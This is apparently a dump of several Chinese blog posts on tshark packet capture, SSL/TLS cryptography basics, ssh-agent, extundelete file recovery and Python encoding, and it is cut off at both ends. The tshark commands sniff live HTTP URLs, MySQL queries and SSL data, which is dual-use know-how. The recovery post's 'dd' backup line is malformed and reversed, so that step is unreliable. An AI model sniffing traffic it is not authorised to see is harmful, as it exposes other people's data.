设置网络接口以非混合模式工作，即只关心和本机有关的流量。\n-B 设置内核缓冲区大小，仅对windows有效。\n\n   链路层设置\n-y 设置抓包的数据链路层协议，不设置则默认为-L找到的第一个协议，局域网一般是EN10MB等。\n-L 列出本机支持的数据链路层协议，供-y参数使用。\n\n   过滤器\n-f 设定抓包过滤表达式（capture filter expression）。抓包过滤表达式的写法雷同于tcpdump，可参考tcpdump man page的有关部分。\n\n   控制抓包完成条件\n-c 抓取的packet数，在处理一定数量的packet后，停止抓取，程序退出。\n-a 设置tshark抓包停止向文件书写的条件，事实上是tshark在正常启动之后停止工作并返回的条件。条件写为test:value的形式，如“-a duration:5”表示tshark启动后在5秒内抓包然后停止；“-a filesize:10”表示tshark在输出文件达到10kB后停止；“-a files:n”表示tshark在写满n个文件后停止。（windows版的tshark0.99.3用参数“-a files:n”不起作用——会有无数多个文件生成。由于-b参数有自己的files参数，所谓“和-b的其它参数结合使用”无从说起。这也许是一个bug，或tshark的man page的书写有误。）\n\n文件输入\n-r 设置tshark分析的输入文件。tshark既可以抓取分析即时的网络流量，又可以分析dump在文件中的数据。-r不能是命名管道和标准输入。\n处理类\n-R 设置读取（显示）过滤表达式（read filter expression）。不符合此表达式的流量同样不会被写入文件。注意，读取（显示）过滤表达式的语法和底层相关的抓包过滤表达式语法不相同，它的语法表达要丰富得多，请参考http://www.ethereal.com/docs/dfref/和http://www.ethereal.com/docs/man-pages/ethereal-filter.4.html。类似于抓包过滤表达式，在命令行使用时最好将它们quote起来。\n-n 禁止所有地址名字解析（默认为允许所有）。\n-N 启用某一层的地址名字解析。“m”代表MAC层，“n”代表网络层，“t”代表传输层，“C”代表当前异步DNS查找。如果-n和-N参数同时存在，-n将被忽略。如果-n和-N参数都不写，则默认打开所有地址名字解析。\n-d 将指定的数据按有关协议解包输出。如要将tcp 8888端口的流量按http解包，应该写为“-d tcp.port==8888,http”。注意选择子和解包协议之间不能留空格。\n输出类\n文件输出控制\n-b 设置ring buffer文件参数。ring buffer的文件名由-w参数决定。-b参数采用test:value的形式书写。“-b duration:5”表示每5秒写下一个ring buffer文件；“-b filesize:5”表示每达到5kB写下一个ring buffer文件；“-b files:7”表示ring buffer文件最多7个，周而复始地使用，如果这个参数不设定，tshark会将磁盘写满为止。\n-w 设置raw数据的输出文件。这个参数不设置，tshark将会把解码结果输出到stdout。“-w-”表示把raw输出到stdout。如果要把解码结果输出到文件，使用重定向“  ”而不要-w参数。\n-F 设置输出raw数据的格式，默认为libpcap。“tshark -F”会列出所有支持的raw格式。\n-S 在向raw文件输出的同时，将解码结果打印到控制台。\n\n-V 设置将解码结果的细节输出，否则解码结果仅显示一个packet一行的summary。\n-x 设置在解码输出结果中，每个packet后面以HEX dump的方式显示具体数据。\n-T 设置解码结果输出的格式，包括text,ps,psml和pdml，默认为text。\n-t 设置解码结果的时间格式。“ad”表示带日期的绝对时间，“a”表示不带日期的绝对时间，“r”表示从第一个包到现在的相对时间，“d”表示两个相邻包之间的增量时间（delta）。\n-l 在处理每个包时即时刷新输出。\n-X 扩展项。\n-q 设置安静的stdout输出（例如做统计时）\n-z 设置统计参数。\n其它\n-h 显示命令行帮助。\n-v 显示tshark的版本信息。\n-o 重载选项。\n\n1、安装方法\n\n    CentOS: yum install -y wireshark\n    Ubuntu: apt-get install -y tshark\n\n2、实时打印当前http请求的url(包括域名)\n\n    tshark -s 512 -i eth0 -n -f 'tcp dst port 80' -R 'http.host and http.request.uri' -T fields -e http.host -e http.request.uri -l | tr -d '\\t'\n\n下面介绍参数含义：\n\n    -s 512 :只抓取前512个字节数据\n    -i eth0 :捕获eth0网卡\n    -n :禁止网络对象名称解析\n    -f ‘tcp dst port 80’ :只捕捉协议为tcp,目的端口为80的数据包\n    -R ‘http.host and http.request.uri’ :过滤出http.host和http.request.uri\n    -T fields -e http.host -e http.request.uri :打印http.host和http.request.uri\n    -l ：输出到标准输出\n\n3、实时打印当前mysql查询语句\n\n    tshark -s 512 -i eth0 -n -f 'tcp dst port 3306' -R 'mysql.query' -T fields -e mysql.query\n\n下面介绍参数含义：\n\n    -s 512 :只抓取前512个字节数据\n    -i eth0 :捕获eth0网卡\n    -n :禁止网络对象名称解析\n    -f ‘tcp dst port 3306’ :只捕捉协议为tcp,目的端口为3306的数据包\n    -R ‘mysql.query’ :过滤出mysql.query\n    -T fields -e mysql.query :打印mysql查询语句\n\ntshark使用-f来指定捕捉包过滤规则，规则与tcpdump一样，可以通过命令man pcap-filter来查得。\ntshark使用-R来过滤已捕捉到的包，与界面版wireshark的左上角Filter一致。\n\n//打印http协议流相关信息\ntshark -s 512 -i eth0 -n -f 'tcp dst port 80' -R 'http.host and http.request.uri' -T fields -e http.host -e http.request.uri -l | tr -d '\\t'\n　　注释：\n　　　　-s: 只抓取前512字节；\n　　　　-i: 捕获eth0网卡；\n　　　　-n: 禁止网络对象名称解析;\n　　　　-f: 只捕获协议为tcp,目的端口为80;\n　　　　-R: 过滤出http.host和http.request.uri;\n　　　　-T,-e: 指的是打印这两个字段;\n　　　　-I: 输出到命令行界面;\n//实时打印当前mysql查询语句\ntshark -s 512 -i eth0 -n -f 'tcp dst port 3306' -R 'mysql.query' -T fields -e mysql.query\n　　　注释:\n　　　　-R: 过滤出mysql的查询语句;\n//导出smpp协议header和value的例子\ntshark -r test.cap -R '(smpp.commandid==0x80000004) and (smpp.commandstatus==0x0)' -e smpp.messageid -e frame.time -T fields -E header=y   test.txt\n　　　注释:\n　　　　-r: 读取本地文件，可以先抓包存下来之后再进行分析;\n　　　　-R: smpp...可以在wireshark的过滤表达式里面找到，后面会详细介绍;\n　　　　-E: 当-T字段指定时，设置输出选项，header=y意思是头部要打印;\n　　　　-e: 当-T字段指定时，设置输出哪些字段;\n　　　　   : 重定向;\n//统计http状态\ntshark -n -q -z http,stat, -z http,tree\n　　　注释:\n　　　　-q: 只在结束捕获时输出数据，针对于统计类的命令非常有用;\n　　　　-z: 各类统计选项，具体的参考文档，后面会介绍，可以使用tshark -z help命令来查看所有支持的字段;\n　　　　　　 http,stat: 计算HTTP统计信息，显示的值是HTTP状态代码和HTTP请求方法。\n　　　　　　 http,tree: 计算HTTP包分布。 显示的值是HTTP请求模式和HTTP状态代码。\n//抓取500个包提取访问的网址打印出来\ntshark -s 0 -i eth0 -n -f 'tcp dst port 80' -R 'http.host and http.request.uri' -T fields -e http.host -e http.request.uri -l -c 500\n　　　注释:\n　　　　-f: 抓包前过滤；\n　　　　-R: 抓包后过滤；\n　　　　-l: 在打印结果之前清空缓存;\n　　　　-c: 在抓500个包之后结束;\n//显示ssl data数据\ntshark -n -t a -R ssl -T fields -e \"ip.src\" -e \"ssl.appdata\"\n\n//读取指定报文,按照ssl过滤显示内容\ntshark -r temp.cap -R \"ssl\" -V -T text\n　　注释:\n　　　　-T text: 格式化输出，默认就是text;\n　　　　-V: 增加包的输出;//-q 过滤tcp流13，获取data内容\ntshark -r temp.cap -z \"follow,tcp,ascii,13\"\n\n//按照指定格式显示-e\ntshark -r temp.cap -R ssl -Tfields -e \"ip.src\" -e tcp.srcport -e ip.dst -e tcp.dstport\n\n//输出数据\ntshark -r vmx.cap -q -n -t ad -z follow,tcp,ascii,10.1.8.130:56087,10.195.4.41:446 | more\n　　注释:\n　　　　-t ad: 输出格式化时间戳;\n//过滤包的时间和rtp.seq\ntshark  -i eth0 -f \"udp port 5004\"  -T fields -e frame.timeepoch -e rtp.seq -o rtp.heuristicrtp:true 1  test.txt\n　　注释:\n　　　　-o: 覆盖属性文件设置的一些值;\n\n//提取各协议数据部分\ntshark -r H:/httpsession.pcap -q -n -t ad -z follow,tcp,ascii,71.6.167.142:27017,101.201.42.120:59381 | more\n复制代码\n上面的例子已经涵盖了大部分的选项，下面我针对每一个选项进行简要解释，并给出这个选项常用的值；\n\n3、选项介绍\n\n　　在命令行下可以使用tshark -help得到选项的简单介绍，具体的需要查阅官方文档https://www.wireshark.org/docs/man-pages/tshark.html\n\n复制代码\n捕获接口:\n　　-i: -i interface 指定捕获接口，默认是第一个非本地循环接口;\n　　-f: -f capture filter 设置抓包过滤表达式，遵循libpcap过滤语法，这个实在抓包的过程中过滤，如果是分析本地文件则用不到。\n　　-s: -s snaplen 设置快照长度，用来读取完整的数据包，因为网络中传输有65535的限制，值0代表快照长度65535，默认也是这个值；\n　　-p: 以非混合模式工作，即只关心和本机有关的流量。\n　　-B: -B buffer size 设置缓冲区的大小，只对windows生效，默认是2M;\n　　-y: -ylink type 设置抓包的数据链路层协议，不设置则默认为-L找到的第一个协议，局域网一般是EN10MB等;\n　　-D: 打印接口的列表并退出;\n　　-L 列出本机支持的数据链路层协议，供-y参数使用。\n\n捕获停止选项:\n　　-c: -c packet count 捕获n个包之后结束，默认捕获无限个;\n　　-a: -a autostop cond. ... duration:NUM，在num秒之后停止捕获;\n　　　　　　　　　　　　　　　　　　 filesize:NUM，在numKB之后停止捕获;\n　　　　　　　　　　　　　　　　　   files:NUM，在捕获num个文件之后停止捕获;\n捕获输出选项:\n　　-b ringbuffer opt. ... ring buffer的文件名由-w参数决定,-b参数采用test:value的形式书写;\n　　　　　　　　　　　　　　　　 duration:NUM - 在NUM秒之后切换到下一个文件;\n　　　　　　　　　　　　　　　　 filesize:NUM - 在NUM KB之后切换到下一个文件;\n　　　　　　　　　　　　　　　　 files:NUM - 形成环形缓冲，在NUM文件达到之后;\n\nRPCAP选项:\n　　remote packet capture protocol，远程抓包协议进行抓包；\n　　-A:  -A user:password,使用RPCAP密码进行认证;\n\n输入文件:\n　　-r: -r infile 设置读取本地文件\n\n处理选项:\n　　-2: 执行两次分析\n　　-R: -R read filter,包的读取过滤器，可以在wireshark的filter语法上查看；在wireshark的视图-  过滤器视图，在这一栏点击表达式，就会列出来对所有协议的支持。\n　　-Y: -Y display filter,使用读取过滤器的语法，在单次分析中可以代替-R选项;\n　　-n: 禁止所有地址名字解析（默认为允许所有）\n　　-N: 启用某一层的地址名字解析。“m”代表MAC层，“n”代表网络层，“t”代表传输层，“C”代表当前异步DNS查找。如果-n和-N参数同时存在，-n将被忽略。如果-n和-N参数都不写，则默认打开所有地址名字解析。\n　　-d: 将指定的数据按有关协议解包输出,如要将tcp 8888端口的流量按http解包，应该写为“-d tcp.port==8888,http”;tshark -d. 可以列出所有支持的有效选择器。\n　　\n输出选项:\n　　-w: -w outfile|- 设置raw数据的输出文件。这个参数不设置，tshark将会把解码结果输出到stdout,“-w -”表示把raw输出到stdout。如果要把解码结果输出到文件，使用重定向“  ”而不要-w参数。\n　　-F: -F output file type,设置输出的文件格式，默认是.pcapng,使用tshark -F可列出所有支持的输出文件类型。\n　　-V: 增加细节输出;\n　　-O: -O protocols,只显示此选项指定的协议的详细信息。\n　　-P: 即使将解码结果写入文件中，也打印包的概要信息；\n　　-S: -S separator 行分割符\n　　-x: 设置在解码输出结果中，每个packet后面以HEX dump的方式显示具体数据。\n　　-T: -T pdml|ps|text|fields|psml,设置解码结果输出的格式，包括text,ps,psml和pdml，默认为text\n　　-e: 如果-T fields选项指定，-e用来指定输出哪些字段;\n　　-E: -E fieldsoption=value如果-T fields选项指定，使用-E来设置一些属性，比如\n　　　　header=y|n\n　　　　separator=/t|/s|char\n　　　　occurrence=f|l|a\n　　　　aggregator=,|/s|char\n　　-t: -t a|ad|d|dd|e|r|u|ud 设置解码结果的时间格式。“ad”表示带日期的绝对时间，“a”表示不带日期的绝对时间，“r”表示从第一个包到现在的相对时间，“d”表示两个相邻包之间的增量时间（delta）。\n　　-u: s|hms 格式化输出秒；\n　　-l: 在输出每个包之后flush标准输出\n　　-q: 结合-z选项进行使用，来进行统计分析；\n　　-X: key:value 扩展项，luascript、readformat，具体参见 man pages；\n　　-z：统计选项，具体的参考文档;tshark -z help,可以列出，-z选项支持的统计方式。\n　　\n其他选项:\n　　-h: 显示命令行帮助；\n　　-v: 显示tshark 的版本信息;\n\n复制代码\n 4、部分命令测试\n\n　　在第三节我简要介绍了tshark相关的命令，在这一节我们主要测试几个选项的输出结果，来对命令加深理解。对于第三节的命令选项，比较重要的已经用蓝色标出，方便查阅。\n\n　　使用tshark对数据包进行分析，主要是对过滤器的学习，根据自己的需求写出响应的过滤器，来得到相应的数据。\n\n　　针对于我的需求，先抓包在分析，还想将命令行整合进java语言中，然后进行面向对象的分析，那么就需要一些特别的命令来获取一些数据：\n\n复制代码\n//1. 示例1，分析报文封装的协议\n　　C:\\Users\\sdut  tshark -r H:\\httpsession.pcap -T fields -e frame.number -e frame.protocols -E header=y\n　　--输出　　\n　　frame.number    frame.protocols\n　　1       eth:ethertype:ip:tcp\n　　2       eth:ethertype:ip:tcp\n　　3       eth:ethertype:ip:tcp\n　　4       eth:ethertype:ip:tcp:http\n　　5       eth:ethertype:ip:tcp\n　　6       eth:ethertype:ip:tcp:http:data-text-lines\n　　7       eth:ethertype:ip:tcp\n　　8       eth:ethertype:ip:tcp\n　　9       eth:ethertype:ip:tcp\n　　-e frame.number：显示帧序号\n　　-e frame.time: 显示时间，时间格式为 Sep 21, 2016 17:20:02.233249000 中国标准时间\n　　-e frame.protocols: 显示此数据包使用的协议\n　　-e ip.src: 显示源ip，但是不能跟frame一起用\n　　-e ip.dst: 显示目的ip地址；\n　　-e tcp.port: 显示端口号。\n　　......还有很多，针对需求，一方面可以自己通过wireshark软件显示的头部字段来猜测，另一方面可以查阅文档，https://www.wireshark.org/docs/dfref/，这里面列出了所有支持的-e字段写法，可以在里面搜索ip、frame上面我们使用的这几个就会搜到。\n\n//2.示例2\n　　C:\\Users\\sdut  tshark -2 -r H:\\httpsession.pcap -R \"http.request.line || http.filedata || http.response.line\" -T fields -e http.request.line -e http.filedata -e http.response.line -E header=y\n　　输出：该例子输出http协议的请求头，响应头，和响应数据；\n　　http.request.line　　http.filedata　　http.response.line\n　　......　　　　　　　　　　......　　　　　　......\n　　具体的这个-R过滤写法，可以查看文档，根据自己的需求来。https://wiki.wireshark.org/DisplayFilters\n\n......\n复制代码\n5、参考文献\n\n　　tshark官方文档：https://www.wireshark.org/docs/man-pages/tshark.html\n\n　　wireshark wiki：https://wiki.wireshark.org/\n\n　　捕获过滤器 https://wiki.wireshark.org/CaptureFilters\n\n　　显示过滤器，用于display过滤的字段可以通过https://wiki.wireshark.org/DisplayFilters 查询。如果不过滤-e指定的字段数据都会输出，通过-R过滤之后，只有满足规则的才会输出，会因此-R和-T、-e通常会一起使用。\n\n　　统计：https://wiki.wireshark.org/Statistics","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 firewalld","title":"Linux命令 firewall","text":"---\n不可不知的centos7 firewalld 防火墙的使用\nCentOS 7 firewalld使用简介\nRedHat UsingFirewalls\nCentOS7下Firewall防火墙配置用法详解","tags":null},{"location":"//blog.pytool.com/Hacker/2015-10-01 SSLTLS协议","title":"SSL/TLS协议","text":"精华\nSSL/TLS协议\nHASH 消息摘要算法\n\n消息摘要算法包括MD(Message Digest 消息摘要算法)，SHA(Secure Hash Algorithm 安全散列算法)和MAC(Message authentication code消息验证码)三个系列。主要用于验证数据的完整性，密码加密等领域。\nMD系列算法\n\nMD系列算法包括MD,MD2,MD3,MD4,MD5。是一个不断优化改进的过程。MD5是输入不定长信息，输出固定长度128-bits的算法。基本方式为，求余、取余、调整长度、与链接变量进行循环运算。经过程序流程，生成四个32位数据，最后联合起来成为一个128-bits散列。 - 性能 - 安全性。 - MD5会产生Hash碰撞，不适用于SSL证书，数字签章。 - 彩虹表反查，可以轻松破解。加salt之后，会乐观点，取决于salt的长度。某些网站，轻松使用大数据，上百TB的硬盘，存储了大量组合的MD5值。\n\n最好不要在密码校验的场景使用MD5。目前只适合校验数据完整性。\nSHA系列算法\n\nSHA系列包括五个算法，分别是SHA-1、SHA-224、SHA-256、SHA-384，和SHA-512,后4中并称为SHA2。 SHA是FIPS所认证的五种安全散列算法。这些算法之所以称作“安全”是基于以下两点（根据官方标准的描述）： - 由消息摘要反推原输入消息，从计算理论上来说是很困难的。 - 想要找到两组不同的消息对应到相同的消息摘要，从计算理论上来说也是很困难的。任何对输入消息的变动，都有很高的概率导致其产生的消息摘要迥异。 SHA-1应用在很多安全领域，曾被视为MD5的后继者，不过现在安全性受到严重质疑。目前为止尚无对SHA2的有效攻击，不过SHA2的算法和HSA1基本相似。\nMAC\n\nMAC与MD和SHA不同，MAC是含有密钥的散列函数算法，我们也常把MAC称为HMAC。\n慢Hash函数\n\n一般网站在存储用户密码的时候，使用上述的散列算法进行散列后存储，在用户登录的时候，对用户输入的密码做散列，然后对比验证。如果网站密码泄露，被黑客获取，通过彩虹表可以轻松破解。为了应对破解的问题，有了3种新的慢Hash函数，所谓慢Hash，就是让签名的过程变得很慢，需要消耗更多地cpu和内存，使黑客建立彩虹表的成本变高。\n目前主要有三种bcrypt,scrypt,PBKDF2。\nPBKDF2(Password-Based Key Derivation Function)。PBKDF2简单而言就是将salted hash进行多次重复计算，这个次数是可选择的。如果计算一次所需要的时间是1微秒，那么计算1百万次就需要1秒钟。假如攻击一个密码所需的rainbow table有1千万条，建立所对应的rainbow table所需要的时间就是115天。这个代价足以让大部分的攻击者忘而生畏。\nbcrypt。bcrypt是专门为密码存储而设计的算法，基于Blowfish加密算法变形而来，由Niels Provos和David Mazières发表于1999年的USENIX。 bcrypt最大的好处是有一个参数（work factor)，可用于调整计算强度，而且work factor是包括在输出的摘要中的。随着攻击者计算能力的提高，使用者可以逐步增大work factor，而且不会影响已有用户的登陆。 bcrypt经过了很多安全专家的仔细分析，使用在以安全著称的OpenBSD中，一般认为它比PBKDF2更能承受随着计算能力加强而带来的风险。bcrypt也有广泛的函数库支持，因此使用这种方式存储密码会更安全。\nscrypt。scrypt是由著名的FreeBSD黑客 Colin Percival为他的备份服务 Tarsnap开发的。 和上述两种方案不同，scrypt不仅计算所需时间长，而且占用的内存也多，使得并行计算多个摘要异常困难，因此利用rainbow table进行暴力攻击更加困难。scrypt没有在生产环境中大规模应用，并且缺乏仔细的审察和广泛的函数库支持。但是，scrypt在算法层面只要没有破绽，它的安全性应该高于PBKDF2和bcrypt。 涉及的问题: MD5,SHA-1,HMAC,bcrypt,scrypt,PBKDF2\n\n对称加密算法:\n涉及的问题: DES,3DES,Blowfish,IDEA,RC4,RC5,RC6,AES\n  高级加密标准AES的工作模式（ECB、CBC、CFB、OFB）\n\n非对称加密算法:\n涉及的问题:公钥,私钥,证书系统,RSA,ECC,E1 Gamal,DSA,Diffie–Hellman key exchange。\n\nBase64编码\nRSA/ECB/PKCS1Padding\n\n1、对称密码体制\nAES\n对称密码体制是一种传统密码体制，也称为私钥密码体制。在对称加密系统中，加密和解密采用相同的密钥。因为加解密密钥相同，需要通信的双方必须选择和保存他们共同的密钥，各方必须信任对方不会将密钥泄密出去，这样就可以实现数据的机密性和完整性。对于具有n个用户的网络，需要n(n-1)/2个密钥，在用户群不是很大的情况下，对称加密系统是有效的。但是对于大型网络，当用户群很大，分布很广时，密钥的分配和保存就成了问题。对机密信息进行加密和验证随报文一起发送报文摘要(或散列值)来实现。比较典型的算法有DES(Data Encryption Standard数据加密标准)算法及其变形TripleDES(三重DES)，GDES(广义DES)；欧洲的IDEA；日本的FEAL N、RC5等。DES标准由美国国家标准局提出,主要应用于银行业的电子资金转帐(EFT)领域。DES的密钥长度为56bit。Triple DES使用两个独立的56bit密钥对交换的信息进行3次加密，从而使其有效长度达到112bit。RC2和RC4方法是RSA数据安全公司的对称加密专利算法，它们采用可变密钥长度的算法。通过规定不同的密钥长度,，C2和RC4能够提高或降低安全的程度。对称密码算法的优点是计算开销小，加密速度快，是目前用于信息加密的主要算法。它的局限性在于它存在着通信的贸易双方之间确保密钥安全交换的问题。此外，某一贸易方有几个贸易关系，他就要维护几个专用密钥。它也没法鉴别贸易发起方或贸易最终方，因为贸易的双方的密钥相同。另外，由于对称加密系统仅能用于对数据进行加解密处理，提供数据的机密性，不能用于数字签名。因而人们迫切需要寻找新的密码体制。\n\n2、非对称密码体制\n非对称密码体制也叫公钥加密技术，该技术就是针对私钥密码体制的缺陷被提出来的。在公钥加密系统中，加密和解密是相对独立的，加密和解密会使用两把不同的密钥，加密密钥(公开密钥)向公众公开，谁都可以使用，解密密钥(秘密密钥)只有解密人自己知道，非法使用者根据公开的加密密钥无法推算出解密密钥，顾其可称为公钥密码体制。如果一个人选择并公布了他的公钥，另外任何人都可以用这一公钥来加密传送给那个人的消息。私钥是秘密保存的，只有私钥的所有者才能利用私钥对密文进行解密。公钥密码体制的算法中最著名的代表是RSA系统，此外还有:背包密码、McEliece密码、Diffe_Hellman、 Rabin、零知识证明、椭圆曲线、EIGamal算法等。公钥密钥的密钥管理比较简单,并且可以方便的实现数字签名和验证。但算法复杂,加密数据的速率较低。公钥加密系统不存在对称加密系统中密钥的分配和保存问题，对于具有n个用户的网络，仅需要2n个密钥。公钥加密系统除了用于数据加密外，还可用于数字签名。公钥加密系统可提供以下功能：A、机密性（Confidentiality）：保证非授权人员不能非法获取信息，通过数据加密来实现；B、确认（Authentication）：保证对方属于所声称的实体，通过数字签名来实现；C、数据完整性（Data integrity）：保证信息内容不被篡改，入侵者不可能用假消息代替合法消息，通过数字签名来实现；D、不可抵赖性（Nonrepudiation）：发送者不可能事后否认他发送过消息，消息的接受者可以向中立的第三方证实所指的发送者确实发出了消息，通过数字签名来实现。可见公钥加密系统满足信息安全的所有主要目标。\n\nSSL/TLS协议的基本思路是采用公钥加密法，也就是说，客户端先向服务器端索要公钥，然后用公钥加密信息，服务器收到密文后，用自己的私钥解密。\n\n但是，这里有两个问题。\n（1）如何保证公钥不被篡改？\n    解决方法：将公钥放在数字证书中。只要证书是可信的，公钥就是可信的。\n（2）公钥加密计算量太大，如何减少耗用的时间？\n    解决方法：每一次对话（session），客户端和服务器端都生成一个\"对话密钥\"（session key），用它来加密信息。由于\"对话密钥\"是对称加密，所以运算速度非常快，而服务器公钥只用于加密\"对话密钥\"本身，这样就减少了加密运算的消耗时间。\n因此，SSL/TLS协议的基本过程是这样的：\n    （1） 客户端向服务器端索要并验证公钥。\n    （2） 双方协商生成\"对话密钥\"。\n    （3） 双方采用\"对话密钥\"进行加密通信。\n上面过程的前两步，又称为\"握手阶段\"（handshake）。","tags":null},{"location":"//blog.pytool.com/Post/前端技术/2016-11-09 UI","title":"UI","text":"foundation6\n\n11,429种完美的CSS3渐变颜色代码表\n最全前端UI库\n豆瓣UI\nPure\nionic\nGoogle 发布新一代Web UI库Polymer\n\nfoundation6 \nnpm install --global foundation-cli\nfoundation new\ngit clone https://github.com/zurb/foundation-sites-template foundation\nnpm install\nbower install\n\nfoundation CSS Download\n Semantic","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 ssh-agent","title":"Linux命令 ssh-agent","text":"ssh-agent\n\n一直不知道啥是ssh-agent，今晚看了几篇文章，终于领悟到了。\n一般的ssh过程\n\n    ssh-keygen 生成一个公钥私钥，注意，这里生成私钥的时候可以选密码，也可以不选密码。 openssh牛的地方在于能用key 登陆，而非用密码。\n    然后做免密码登陆，一般是复制到.ssh/authorized_keys ,或者用ssh-copy-id 。\n\n其实第二步做完以后基本上就不输密码登陆。那需要ssh-agent 以及ssh-add有什么用呢？\n\n其实ssh-keygen的时候，可以输密码，也可以不输密码，刚才那种就是不输密码的情况，那么如果你输了密码，ssh 登陆的时候还是会提示你将私钥的密码输入的(不需要输入服务器的密码)。而ssh-agent能避免这种反复输入私钥的烦恼。\n用法很简单\n\n    ssh-agent\n    ssh-add 私钥 (这里会提示一次输密码，之后将密码保存在缓存中，之后便不能再input了)\n\nmac上面还有个叫keychain Access 的东西，是管理密码的软件，也是通过ssh-add来实现ssh免密码登陆。","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 extundelete","title":"Linux命令 extundelete","text":"参阅博文《使用 Linux 文件恢复工具》http://www.ibm.com/developerworks/cn/linux/1312caoyqlinuxrestore/\r\n使用\r\n\r\ninode 和 block\r\n\r\n    Linux 文件系统的最基本单元：inode。inode 译成中文就是索引节点，每个存储设备（例如硬盘）或存储设备的分区被格式化为文件系统后，应该有两部份，一部份是 inode，另一部份是 block，block 是用来存储数据用的。而 inode 呢，就是用来存储这些数据的信息，这些信息包括文件大小、属主、归属的用户组、读写权限等。inode 为每个文件进行信息索引，所以就有了 inode 的数值。linux 操作系统下可以使用 ls –id 命令来查看文件或者目录的 inode 值，一般”root”目录的 inode 值为 2,一个分区挂载到一个目录下时，这个”root”目录的 inode 值为 2\r\n\r\n\r\n文件恢复的原理\r\n\r\n    本文要介绍的命令是通过文件系统的 inode 值（一般是 2 ）来获取文件系统信息。在 ext3 和 ext4 文件系统中，每个文件都是通过 inode 来描述其数据存放的具体位置，当文件被删除以后，inode 的数据指针部分被清零，文件目录区没有太多变化。文件的读写都是通过 inode 来实现，当 inode 数据指针被清零以后，即便文件内容还在，也没有办法把文件内容组合出来。当 ext3 和 ext4 文件系统中的元数据 metadata 发生变化时，相应的元数据 metadata 在日志文件会有一份拷贝。比如一个文件被删除了，它的 inode 信息会在日志文件中先保存一份，然后把要删除文件 inode 相关信息清零。这个日志文件是循环使用的，当操作过多时，删除的文件的 inode 日志记录会被新的数据替换，这就彻底丧失了根据 inode 找回数据的机会了。如果是大量文件的删除，这个日志文件会被反复循环利用多次，只留给最后删除的那些文件的恢复机会。\r\n\r\n\r\n工具名称    工作界面 \t功能简介\r\nforemost\t  命令行\t  formost 是一个基于文件头和尾部信息以及文件的内建数据结构恢复文件的命令行工具\r\nextundelete\t命令行\t  Extundelete 是 ext3、ext4 文件系统的恢复工具\r\nscalpel\t    命令行\t  scalpel 是一种快速文件恢复工具，它通过读取文件系统的数据库来恢复文件。它是独立于文件系统的\r\ntestdisk\t  字符终端\tTestdisk 支持分区表恢复、raid 恢复、分区恢复\r\nphtorec 字符终端 photorec 用来恢复硬盘、光盘中丢失的视频、文档、压缩包等文件，或从数码相机存储卡中恢复丢失的图片\r\n\r\n第一种情况\r\n\r\n当前系统有多个用户,其中一个用户对文件进行修改,则另一个用户对文件进行删除操作,那么这时候该如何操作? 解决方法: 通过文件打开的PID及打开的文件句柄\r\n\r\nlsof | grep -i delete\r\ncp /proc/filePID/fd/# /path/filename\r\n\r\n-i 不区分大小写搜索 #为标志1的文件\r\n\r\n第二种情况\r\n\r\n当前系统只有一个用户在登录,对文件进行了误删除操作,那么这个时候如何操作呢? 注意事项及解决思路:\r\n\r\n停止对当前分区进行修改\r\n\r\n通过dd命令进行对分区备份,防止通过第三方软件恢复失败,造成对数据的丢失\r\n\r\n    dd if=/path/filename of /dev/sdb1\r\n\r\n通过umount命令将当前设备分区基于卸载 umount /dev/sda或者umount /mountpoit\r\n\r\n\r\n卸载分区(防止继续写入)\r\nextundelete /dev/sda4 --inode 2 （查看节点深度文件）\r\nextundelete  /dev/sda4 --restore-inode  12（根据inode 恢复）\r\nextundelete /dev/sda4 --restore-file  passwd（根据文件名）\r\nextundelete  /dev/sda4 --restore-all （恢复所有文件）\r\n\r\n恢复单个文件\r\nsudo extundelete /dev/sda7 --restore-file /home/dg/c/sortbinary.c\r\n\r\nextundelete-【工具下载】\r\n\r\n除了PhotoRec之外，我们也可以选择使用extundelete来完成数据恢复工作。extundelete针对的是ext3和ext4文件系统，所以相较于TestDisk而言，extundelete的使用范围就有一定的限制了。\r\n\r\n通常情况下，在进行文件恢复工作的时候，我们要先将文件系统重新挂载，然后给它分配只读权限。完成之后，再将恢复的文件写入另外一个文件系统中，这样可以避免原始数据所在的存储区域被覆盖。使用extundelete来恢复文件的操作步骤非常的简单，我们只需要选择相应的文件系统，然后运行下面这条命令即可：\r\n\r\nextundelete /dev/sda1 --restore-all\r\n\r\n\r\napt-get install extundelete\r\n\r\n 搜索 extundelete --inode 1 /dev/dm-0\r\n 恢复 extundelete --restore-inode inode /dev/dm-0\r\n        extundelete --restore-all /dev/dm-0\r\n 3.文件,目录,时间 extundelete --help","tags":null},{"location":"//blog.pytool.com/Post/python/2016-06-01 python 编码encode decode","title":"python 编码","text":"      u = u\"中文\"\n      u\nu'\\u4e2d\\u6587'\n      s = \"中文\"\n      s\n'\\xe4\\xb8\\xad\\xe6\\x96\\x87'\n\n      s.decode(\"utf8\")\nu'\\u4e2d\\u6587'\n      u.encode(\"gbk\")\n'\\xd6\\xd0\\xce\\xc4'\n\n      s.encode(\"gbk\")\nTraceback (most recent call last):\n  File \"stdin\", line 1, in module\nUnicodeDecodeError: 'ascii' codec can't decode byte 0xe4 in position 0: ordinal not in range(128)\n      u.decode(\"utf8\")\nTraceback (most recent call last):\n  File \"stdin\", line 1, in module\n  File \"/usr/lib/python2.7/encodings/utf8.py\", line 16, in decode\n    return codecs.utf8_decode(input, errors, True)\nUnicodeEncodeError: 'ascii' codec can't encode characters in position 0-1: ordinal not in range(128)\n\npython编码encode和decode\n\n计算机里面，编码方法有很多种，英文的一般用ascii,而中文有unicode，utf-8,gbk,utf-16等等。\n\nunicode是 utf-8,gbk,utf-16这些的父编码，这些子编码都能转换成unicode编码，然后转化成子编码，例如utf8可以转成unicode，再转gbk，但不能直接从utf8转gbk\n\n所以，python中就有两个方法用来解码（decode）与编码（encode），解码是子编码转unicode，编码就是unicode转子编码\n\n1.编码\n\nencoding=utf-8\nc=u'\\u5f00\\u59cb\\u6267\\u884c\\u66f4\\u65b0\\u547d\\u4ee4'\nprint c\nprint c.encode('utf8')\nprint c.encode('gbk')\n\n在这里，文件的编码方式为utf8,控制台的编码方式是utf8\n变量c是一个unicode编码的字符串（需要在引号前面加u）\n\n输出的结果为：\n\n开始执行更新命令\n开始执行更新命令\n��ʼִ�и�������\n\n因为控制台是utf8编码，所以unicode编码和utf8编码都能识别，但是gbk就不可以了\n2.解码\n\nencoding=utf-8\na = '中文'\nprint a.decode('g')\nprint 